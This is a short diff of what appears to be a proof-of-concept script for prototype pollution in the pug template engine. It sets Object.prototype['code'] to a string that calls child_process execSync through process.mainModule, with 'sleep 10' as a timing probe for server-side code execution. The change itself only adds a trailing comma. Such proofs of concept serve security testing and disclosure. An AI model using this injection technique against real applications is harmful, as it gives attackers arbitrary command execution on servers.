@@ -2,7 +2,7 @@ pug = require("pug")
 
 
 Object.prototype['code'] = { 
-    val: "process.mainModule.require('child_process').execSync(\`sleep 10\`)"
+    val: "process.mainModule.require('child_process').execSync(\`sleep 10\`)",
 }
 
 
